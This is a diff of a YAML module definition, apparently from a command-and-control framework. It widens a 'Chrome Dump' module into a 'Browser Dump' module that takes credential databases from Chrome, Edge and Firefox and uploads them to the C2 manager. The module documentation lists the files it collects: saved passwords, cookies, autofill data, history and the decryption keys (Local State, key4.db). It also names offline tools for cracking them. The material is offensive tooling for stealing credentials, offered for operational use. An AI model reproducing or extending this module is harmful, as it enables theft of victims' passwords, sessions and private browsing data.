@@ -240,22 +240,42 @@ categories:
           requires_admin: true
         ui:
           layout: simple
-      chrome_dump:
-        display_name: Chrome Dump
-        description: Extract and upload Chrome credential databases to C2 manager
-        command_template: execute_module|ChromeDump
-        parameters: {}
+      browser_dump:
+        display_name: Browser Dump
+        description: Extract and upload browser credential databases to C2 manager
+        command_template: execute_module|BrowserDump|{chrome},{edge},{firefox}
+        parameters:
+          chrome:
+            type: boolean
+            display_name: Google Chrome
+            description: Extract data from Google Chrome
+            required: false
+            default: true
+          edge:
+            type: boolean
+            display_name: Microsoft Edge
+            description: Extract data from Microsoft Edge (Chromium)
+            required: false
+            default: true
+          firefox:
+            type: boolean
+            display_name: Mozilla Firefox
+            description: Extract data from Mozilla Firefox
+            required: false
+            default: true
         documentation:
-          content: Extracts critical Chrome files from all profiles and uploads them
-            individually to the C2 manager. Uploads the following files from each
-            profile (Default, Profile 1, Profile 2, etc.) - Login Data (saved passwords),
-            Cookies, Web Data (autofill), History, Bookmarks, and Preferences. Also
-            uploads the Local State file which contains the encryption key needed
-            to decrypt passwords. Files are renamed with timestamps to prevent collisions.
-            No compression or ZIP creation - files uploaded directly for maximum
-            reliability. Use offline tools like ChromePass or mimikatz to decrypt
-            the Login Data files.
-          examples: []
+          content: Extracts critical files from selected browsers and uploads them
+            individually to the C2 manager. For Chrome/Edge - uploads Login Data
+            (saved passwords), Cookies, Web Data (autofill), History, Bookmarks,
+            Preferences, and Local State (encryption key). For Firefox - uploads
+            logins.json (encrypted passwords), key4.db (encryption key), cookies.sqlite,
+            and places.sqlite (history/bookmarks). Supports multiple profiles for
+            all browsers. Files are renamed with browser name and timestamps to prevent
+            collisions. Use offline tools like ChromePass, WebBrowserPassView, or
+            Firefox Decrypt to extract credentials.
+          examples:
+          - Select all browsers for comprehensive extraction
+          - Select only Chrome if Firefox is not installed
         execution:
           timeout: 600
           requires_admin: false
